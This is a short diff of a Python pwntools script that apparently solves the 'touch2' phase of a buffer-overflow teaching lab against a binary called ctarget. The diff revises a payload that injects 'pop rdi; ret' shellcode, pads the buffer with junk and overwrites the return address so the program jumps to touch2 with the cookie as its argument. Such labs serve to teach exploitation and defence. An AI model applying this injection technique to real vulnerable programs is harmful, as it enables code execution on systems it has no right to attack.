@@ -27,16 +27,13 @@ p = process(ctarget)
 input("# touch2")
 
 input_buf_addr = 0x5561dc78
-pop_rdi_ret = 0x40141b
 
-# mov rdi, cookie
-# pop rax // for alignment
+# pop rdi
 # ret
-mov_pop = 0x5859b997fac7c748
-ret = 0xc3
-cmd_p64 = set_p64(mov_pop) + set_p64(ret)
+pop_rdi_ret = 0xc35f
+cmd_p64 = set_p64(pop_rdi_ret)
 junk = "a" * (junk_size - len(cmd_p64))
-payload = cmd_p64 + junk + set_p64(input_buf_addr) + set_p64(0) + set_p64(touch2)
+payload = cmd_p64 + junk + set_p64(input_buf_addr) + set_p64(cookie) + set_p64(touch2)
 
 p.sendline(payload)
 print(str(p.recv(), "ascii"))
